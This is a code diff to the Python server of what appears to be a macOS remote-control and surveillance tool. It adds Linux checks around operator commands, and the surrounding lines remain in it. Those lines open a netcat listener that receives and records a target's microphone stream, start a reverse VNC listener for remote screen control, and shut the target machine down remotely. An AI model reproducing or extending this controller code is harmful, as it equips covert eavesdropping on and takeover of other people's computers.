@@ -423,7 +423,7 @@ def main():
                    
                     workingdirFormatted = blue + workingdir + endC
                     if macOS_rl:
-                        if platform.system() == "Linux":
+                        if platform.system() == 'Linux':
                             readline.parse_and_bind("tab: complete")
                             readline.set_completer(tab_parser)
                         else:
@@ -523,21 +523,24 @@ def main():
                         nextcmd = "osascript -e 'tell application \"System Events\" to shut down'"
 
                     if nextcmd == "mike_stream":
-                        try:
-                            if not os.path.exists(client_log_path + 'Microphone'):
-                                os.makedirs(client_log_path + 'Microphone')
-                            subprocess.check_output("osascript >/dev/null <<EOF\n\
-                            tell application \"Terminal\"\n\
-                            ignoring application responses\n\
-                            do script \"nc -l 2897 | tee '%s%s%s' 2>&1 | %s/Payloads/speakerpipe\"\n\
-                            end ignoring\n\
-                            end tell\n\
-                            EOF" % (client_log_path, 'Microphone/', time.strftime("%b %d %Y %I:%M:%S %p"), os.getcwd()), shell=True) #tee the output for later storage, and also do an immediate stream
-                        except subprocess.CalledProcessError as e:
-                            pass #this is expected 'execution error: Can't get end'
-                        except Exception as e:
-                            print 'Error launching listener.\n[%s]' % e
-                            nextcmd = ''
+                        if platform.system() == 'Linux':
+                            print '%sThere is not yet Linux support for a microphone stream.\n' % redX
+                        else:
+                            try:
+                                if not os.path.exists(client_log_path + 'Microphone'):
+                                    os.makedirs(client_log_path + 'Microphone')
+                                subprocess.check_output("osascript >/dev/null <<EOF\n\
+                                tell application \"Terminal\"\n\
+                                ignoring application responses\n\
+                                do script \"nc -l 2897 | tee '%s%s%s' 2>&1 | %s/Payloads/speakerpipe\"\n\
+                                end ignoring\n\
+                                end tell\n\
+                                EOF" % (client_log_path, 'Microphone/', time.strftime("%b %d %Y %I:%M:%S %p"), os.getcwd()), shell=True) #tee the output for later storage, and also do an immediate stream
+                            except subprocess.CalledProcessError as e:
+                                pass #this is expected 'execution error: Can't get end'
+                            except Exception as e:
+                                print 'Error launching listener.\n[%s]' % e
+                                nextcmd = ''
 
                     if nextcmd == "shutdown_server":
                         nextcmd = ""
@@ -551,10 +554,13 @@ def main():
                             nextcmd = ""  
 
                     if nextcmd == "vnc":
-                        vnc_port = 5500
-                        nextcmd = "vnc_start:::%s" % vnc_port
-                        proc = subprocess.Popen("/Applications/VNC\ Viewer.app/Contents/MacOS/vncviewer -listen %s" % vnc_port, shell=True)
-                        subprocess_list.append(proc.pid)
+                        if platform.system() == 'Linux':
+                            print '%sThere is not yet Linux support for a reverse VNC connection.\n' % redX
+                        else:
+                            vnc_port = 5500
+                            nextcmd = "vnc_start:::%s" % vnc_port
+                            proc = subprocess.Popen("/Applications/VNC\ Viewer.app/Contents/MacOS/vncviewer -listen %s" % vnc_port, shell=True)
+                            subprocess_list.append(proc.pid)
 
                     if nextcmd == "volume":
                         vol_level = str(raw_input("Set volume to? (0[low]-7[high]) "))
